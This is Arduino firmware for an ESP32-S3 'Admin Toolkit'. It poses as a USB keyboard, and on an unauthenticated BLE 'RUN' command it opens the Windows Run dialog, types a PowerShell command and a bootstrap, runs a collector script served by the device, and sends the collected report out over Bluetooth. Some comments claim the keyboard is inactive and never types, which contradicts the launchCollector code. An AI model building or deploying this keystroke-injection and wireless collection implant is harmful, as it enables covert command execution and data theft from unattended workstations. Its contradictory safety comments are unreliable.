/*
 * ESP32-S3 Admin Toolkit, firmware 0.2.0
 * Original implementation. No Wi-Fi, pairing, PIN, background script execution,
 * or unattended HID keystrokes. BLE RUN explicitly triggers a read-only PowerShell collector on an unlocked workstation.
 *
 * USB: Arduino TinyUSB CDC (Serial), HID keyboard descriptor (inactive).
 * BLE: Nordic-style UART service, RX writes and TX notifications.
 * Storage: single latest report in LittleFS, limited to 64 KiB.
 */
#include <Arduino.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLE2902.h>
#include <LittleFS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>

namespace cfg {
constexpr char kName[] = "AdminToolkit-S3";
constexpr char kService[] = "6E400001-B5A3-F393-E0A9-E50E24DCCA9E";
constexpr char kRx[] = "6E400002-B5A3-F393-E0A9-E50E24DCCA9E";
constexpr char kTx[] = "6E400003-B5A3-F393-E0A9-E50E24DCCA9E";
constexpr char kReport[] = "/report.json";
constexpr char kTemp[] = "/incoming.part";
constexpr size_t kMaxReport = 65536;
constexpr size_t kChunk = 64;         // USB payload bytes per stop-and-wait line
constexpr size_t kBleChunk = 16;      // 1(type)+2(seq)+16(payload) <= ATT MTU 23
constexpr uint32_t kAckTimeout = 900; // BLE resend when app acknowledgment is absent
constexpr uint8_t kMaxRetries = 8;
constexpr int kBtn = 0;
constexpr int kTftCs = 4, kTftDc = 2, kTftRst = 1;
constexpr int kTftMosi = 3, kTftSclk = 5, kTftBl = 38;
}

Adafruit_ST7735 display(cfg::kTftCs, cfg::kTftDc, cfg::kTftMosi, cfg::kTftSclk, cfg::kTftRst);
USBHIDKeyboard keyboard;
BLECharacteristic *bleTx = nullptr;
BLEAdvertising *advertising = nullptr;
volatile bool bleConnected = false;
volatile bool needAdvertise = false;
volatile bool requestGet = false;
volatile bool requestStart = false;
volatile bool requestStop = false;
volatile int32_t ackedSeq = -1;
volatile bool requestStatus = false;
volatile bool requestRun = false;
bool hidBusy = false;

File upload;
File sendFile;
bool fsReady = false;
bool uploading = false;
size_t expectedSize = 0, receivedSize = 0;
uint32_t expectedCrc = 0, runningCrc = 0xFFFFFFFFU;
uint32_t reportCrc = 0;
size_t reportSize = 0;
uint32_t expectedUploadSeq = 0;
String usbLine;
bool transferActive = false;
bool waitingAck = false;
uint16_t nextBleSeq = 0;
uint16_t pendingSeq = 0;
uint8_t pendingFrame[20];
size_t pendingLen = 0;
uint8_t retries = 0;
uint32_t lastSend = 0;
size_t sendRemaining = 0;
uint32_t lastDraw = 0;
String diagnosticStage = "READY";
#include "generated_collector.h"

uint32_t crcUpdate(uint32_t value, const uint8_t *data, size_t len) {
  for (size_t i = 0; i < len; ++i) {
    value ^= data[i];
    for (int j = 0; j < 8; ++j) value = (value >> 1) ^ ((value & 1U) ? 0xEDB88320U : 0U);
  }
  return value;
}

bool hexNibble(char c, uint8_t &out) {
  if (c >= '0' && c <= '9') out = c - '0';
  else if (c >= 'a' && c <= 'f') out = c - 'a' + 10;
  else if (c >= 'A' && c <= 'F') out = c - 'A' + 10;
  else return false;
  return true;
}

bool parseU32(const String &text, uint32_t &n, int base = 10) {
  if (text.length() == 0 || text.length() > 10) return false;
  char *end = nullptr;
  unsigned long value = strtoul(text.c_str(), &end, base);
  if (*end != '\0' || value > 0xFFFFFFFFUL || text[0] == '-') return false;
  n = static_cast<uint32_t>(value);
  return true;
}

void notifyText(const String &s);
void usbReply(const String &message) { Serial.println(message); }

void closeUpload(bool removePartial) {
  if (upload) upload.close();
  uploading = false;
  if (removePartial && fsReady) LittleFS.remove(cfg::kTemp);
}

void usbCommand(const String &line) {
  if (line == "PING") { usbReply("PONG|0.2.0"); return; }
  if (line == "SCRIPT") {
    diagnosticStage = "COLLECTOR";
    // Explicitly requested after a BLE RUN; collector payload is build-time pinned.
    for (size_t i = 0; i < sizeof(kCollectorBase64) - 1; i += 128) {
      size_t n = min(static_cast<size_t>(128), sizeof(kCollectorBase64) - 1 - i);
      Serial.write(reinterpret_cast<const uint8_t *>(kCollectorBase64 + i), n);
      Serial.print("\n");
      delay(1);
    }
    usbReply("ENDSCRIPT");
    return;
  }
  if (line == "INFO") {
    usbReply(String("INFO|") + (fsReady ? "READY" : "NOFS") + "|" + String(cfg::kMaxReport));
    return;
  }
  if (!fsReady) { usbReply("ERR|NOFS"); return; }
  if (line.startsWith("BEGIN|")) {
    int bar = line.indexOf('|', 6);
    if (bar < 0) { usbReply("ERR|FORMAT"); return; }
    uint32_t len = 0, crc = 0;
    if (!parseU32(line.substring(6, bar), len) ||
        !parseU32(line.substring(bar + 1), crc, 16) ||
        len == 0 || len > cfg::kMaxReport) { usbReply("ERR|SIZE_OR_CRC"); return; }
    closeUpload(true);
    upload = LittleFS.open(cfg::kTemp, FILE_WRITE);
    if (!upload) { usbReply("ERR|STORAGE"); return; }
    expectedSize = len; expectedCrc = crc;
    receivedSize = 0; expectedUploadSeq = 0; runningCrc = 0xFFFFFFFFU;
    uploading = true;
    diagnosticStage = "RECEIVING";
    notifyText("P|RECEIVING");
    usbReply("READY");
    return;
  }
  if (line.startsWith("DATA|")) {
    if (!uploading) { usbReply("ERR|NO_BEGIN"); return; }
    int bar = line.indexOf('|', 5);
    if (bar < 0) { usbReply("ERR|FORMAT"); return; }
    uint32_t seq = 0;
    if (!parseU32(line.substring(5, bar), seq)) { usbReply("ERR|SEQ"); return; }
    if (seq + 1 == expectedUploadSeq) { usbReply("ACK|" + String(seq)); return; }
    if (seq != expectedUploadSeq) { usbReply("ERR|SEQ"); return; }
    String hex = line.substring(bar + 1);
    if (hex.isEmpty() || hex.length() > cfg::kChunk * 2 || hex.length() % 2 != 0 ||
        receivedSize + hex.length() / 2 > expectedSize) { usbReply("ERR|CHUNK"); return; }
    uint8_t data[cfg::kChunk];
    for (size_t i = 0; i < hex.length() / 2; ++i) {
      uint8_t hi = 0, lo = 0;
      if (!hexNibble(hex[i * 2], hi) || !hexNibble(hex[i * 2 + 1], lo)) {
        usbReply("ERR|HEX"); return;
      }
      data[i] = (hi << 4) | lo;
    }
    size_t len = hex.length() / 2;
    if (upload.write(data, len) != len) { closeUpload(true); usbReply("ERR|WRITE"); return; }
    runningCrc = crcUpdate(runningCrc, data, len);
    receivedSize += len;
    expectedUploadSeq++;
    usbReply("ACK|" + String(seq));
    return;
  }
  if (line == "END") {
    if (!uploading) { usbReply("ERR|NO_BEGIN"); return; }
    bool valid = receivedSize == expectedSize && (~runningCrc) == expectedCrc;
    closeUpload(false);
    if (!valid) { LittleFS.remove(cfg::kTemp); usbReply("ERR|CRC_OR_LENGTH"); return; }
    // Preserve last valid report until a complete replacement is available.
    // LittleFS rename replacement behavior varies; first delete the old report.
    if (sendFile) sendFile.close();
    transferActive = false;
    LittleFS.remove(cfg::kReport);
    if (!LittleFS.rename(cfg::kTemp, cfg::kReport)) {
      usbReply("ERR|RENAME"); return;
    }
    reportSize = expectedSize;
    reportCrc = expectedCrc;
    usbReply("DONE|" + String(reportSize));
    diagnosticStage = "DONE";
    notifyText("P|DONE");
    return;
  }
  if (line == "ABORT") { closeUpload(true); usbReply("ABORTED"); return; }
  usbReply("ERR|UNKNOWN_COMMAND");
}

void pollUsb() {
  size_t budget = 300;
  while (Serial.available() && budget--) {
    char c = static_cast<char>(Serial.read());
    if (c == '\r') continue;
    if (c == '\n') {
      if (!usbLine.isEmpty()) usbCommand(usbLine);
      usbLine = "";
    } else {
      if (usbLine.length() >= 256) { usbLine = ""; usbReply("ERR|LINE_TOO_LONG"); }
      else usbLine += c;
    }
  }
}

class ServerEvents : public BLEServerCallbacks {
  void onConnect(BLEServer *) override { bleConnected = true; }
  void onDisconnect(BLEServer *) override { bleConnected = false; needAdvertise = true; }
};
class RxEvents : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *c) override {
    std::string bytes = c->getValue();
    if (bytes.size() > 32) return;
    String s(bytes.c_str());
    if (s == "GET") requestGet = true;
    else if (s == "START") requestStart = true;
    else if (s == "STOP") requestStop = true;
    else if (s == "STATUS") requestStatus = true;
    else if (s == "RUN") requestRun = true;
    else if (s.startsWith("A|")) {
      uint32_t seq = 0;
      if (parseU32(s.substring(2), seq) && seq <= 65535U) ackedSeq = (int32_t)seq;
    }
  }
};

void notifyBytes(const uint8_t *data, size_t len) {
  if (!bleConnected || bleTx == nullptr || len == 0 || len > 20) return;
  bleTx->setValue(const_cast<uint8_t *>(data), len);
  bleTx->notify();
}
void notifyText(const String &s) { notifyBytes(reinterpret_cast<const uint8_t *>(s.c_str()), s.length()); }

void stopTransfer() {
  if (sendFile) sendFile.close();
  transferActive = false; waitingAck = false;
  pendingLen = 0; sendRemaining = 0;
}

void beginTransfer() {
  stopTransfer();
  if (!fsReady || !LittleFS.exists(cfg::kReport) || reportSize == 0) {
    notifyText("N|NO_REPORT"); return;
  }
  notifyText(String("M|") + reportSize + "|" + String(reportCrc, HEX));
}

void startTransfer() {
  stopTransfer();
  if (!bleConnected || reportSize == 0 || !LittleFS.exists(cfg::kReport)) return;
  sendFile = LittleFS.open(cfg::kReport, FILE_READ);
  if (!sendFile || sendFile.size() != reportSize) { stopTransfer(); notifyText("N|READ"); return; }
  transferActive = true;
  sendRemaining = reportSize;
  nextBleSeq = 0;
  ackedSeq = -1;
}


// Deliberate operator-triggered HID workflow (no automatic action on USB insert).
// Prerequisites: Windows session unlocked, English keyboard layout, no blocking policy.
void hidTap(uint8_t code, bool modifier = false) {
  if (modifier) keyboard.press(KEY_LEFT_GUI);
  keyboard.press(code);
  delay(8);
  keyboard.releaseAll();
  delay(8);
}
void typeAscii(const char *s) {
  for (; *s; ++s) { hidTap(static_cast<uint8_t>(*s)); }
}
void launchCollector() {
  if (!bleConnected || hidBusy) return;
  hidBusy = true;
  diagnosticStage = "LAUNCHING";
  notifyText("P|LAUNCHING");
  // Windows Run dialog; this is an obvious, visible PowerShell session.
  keyboard.press(KEY_LEFT_GUI);
  keyboard.press('r');
  delay(90);
  keyboard.releaseAll();
  delay(900);
  typeAscii("powershell.exe -NoProfile -NoLogo -NoExit");
  hidTap(KEY_RETURN);
  delay(5000);
  // Build script is read from the device's CDC port, SHA-256 checked, written
  // to local TEMP, then run as a file. No execution-policy bypass or elevation.
  typeAscii(kBootstrap);
  hidTap(KEY_RETURN);
  diagnosticStage = "BOOTSTRAP";
  notifyText("P|BOOTSTRAP");
  hidBusy = false;
}

void pollTransfer() {
  if (!bleConnected) { if (transferActive) stopTransfer(); return; }
  if (requestStop) { requestStop = false; stopTransfer(); }
  if (requestGet) { requestGet = false; beginTransfer(); }
  if (requestStatus) {
    requestStatus = false;
    notifyText(reportSize ? String("S|") + reportSize : "S|0");
    notifyText(String("P|") + diagnosticStage);
  }
  if (requestStart) { requestStart = false; startTransfer(); }
  if (!transferActive) return;
  if (waitingAck) {
    if (ackedSeq == pendingSeq) {
      ackedSeq = -1;
      waitingAck = false;
      nextBleSeq++;
      if (sendRemaining == 0) { notifyText("E"); stopTransfer(); return; }
    } else if (millis() - lastSend >= cfg::kAckTimeout) {
      if (retries >= cfg::kMaxRetries) {
        notifyText("N|TIMEOUT"); stopTransfer(); return;
      }
      notifyBytes(pendingFrame, pendingLen);
      lastSend = millis();
      retries++;
    }
  }
  if (!waitingAck && transferActive && sendRemaining) {
    size_t len = min(cfg::kBleChunk, sendRemaining);
    pendingFrame[0] = 'D';
    pendingFrame[1] = static_cast<uint8_t>(nextBleSeq & 0xff);
    pendingFrame[2] = static_cast<uint8_t>((nextBleSeq >> 8) & 0xff);
    if (sendFile.read(&pendingFrame[3], len) != (int)len) {
      notifyText("N|READ"); stopTransfer(); return;
    }
    pendingSeq = nextBleSeq;
    pendingLen = len + 3;
    sendRemaining -= len;
    waitingAck = true;
    retries = 0;
    notifyBytes(pendingFrame, pendingLen);
    lastSend = millis();
  }
}

void renderDisplay() {
  if (millis() - lastDraw < 900) return;
  lastDraw = millis();
  display.fillScreen(ST77XX_BLACK);
  display.setTextSize(1);
  display.setTextWrap(true);
  display.setTextColor(ST77XX_CYAN);
  display.setCursor(2, 12);
  display.println("ADMIN TOOLKIT");
  display.println("  v0.2.0");
  display.setTextColor(ST77XX_WHITE);
  display.print("USB: "); display.println("CDC");
  display.print("BLE: "); display.println(bleConnected ? "linked" : "waiting");
  display.print("JSON: "); display.println(reportSize);
  display.setTextColor(ST77XX_GREEN);
  display.println(uploading ? "Receiving USB" : (transferActive ? "Sending BLE" : diagnosticStage));
}

void setup() {
  pinMode(cfg::kBtn, INPUT_PULLUP); // Reserved for boot / future user confirmation
  pinMode(cfg::kTftBl, OUTPUT);
  digitalWrite(cfg::kTftBl, LOW);
  display.initR(INITR_MINI160x80_PLUGIN);
  display.setRotation(0);
  display.fillScreen(ST77XX_BLACK);
  display.setCursor(4, 20);
  display.setTextColor(ST77XX_CYAN);
  display.setTextSize(1);
  display.print("Admin Toolkit boot");

  fsReady = LittleFS.begin(true);
  if (fsReady && LittleFS.exists(cfg::kReport)) {
    File existing = LittleFS.open(cfg::kReport, FILE_READ);
    if (existing) {
      reportSize = existing.size();
      uint32_t check = 0xFFFFFFFFU;
      uint8_t block[64];
      while (existing.available()) {
        size_t n = existing.read(block, sizeof(block));
        check = crcUpdate(check, block, n);
      }
      reportCrc = ~check;
      existing.close();
      if (reportSize > cfg::kMaxReport) { LittleFS.remove(cfg::kReport); reportSize = 0; }
    }
  }
  keyboard.begin(); // Descriptor only; does not type into the target PC.
  USB.begin();
  Serial.begin(115200);
  usbLine.reserve(280);

  BLEDevice::init(cfg::kName);
  BLEServer *bleServer = BLEDevice::createServer();
  bleServer->setCallbacks(new ServerEvents());
  BLEService *service = bleServer->createService(cfg::kService);
  BLECharacteristic *rx = service->createCharacteristic(
    cfg::kRx, BLECharacteristic::PROPERTY_WRITE | BLECharacteristic::PROPERTY_WRITE_NR);
  rx->setCallbacks(new RxEvents());
  bleTx = service->createCharacteristic(cfg::kTx, BLECharacteristic::PROPERTY_NOTIFY);
  bleTx->addDescriptor(new BLE2902());
  service->start();
  advertising = BLEDevice::getAdvertising();
  advertising->addServiceUUID(cfg::kService);
  advertising->setScanResponse(true);
  advertising->start();
  renderDisplay();
}

void loop() {
  pollUsb();
  if (requestRun) { requestRun = false; launchCollector(); }
  if (needAdvertise) {
    needAdvertise = false;
    stopTransfer();
    if (advertising) advertising->start();
  }
  pollTransfer();
  renderDisplay();
  delay(2);
}
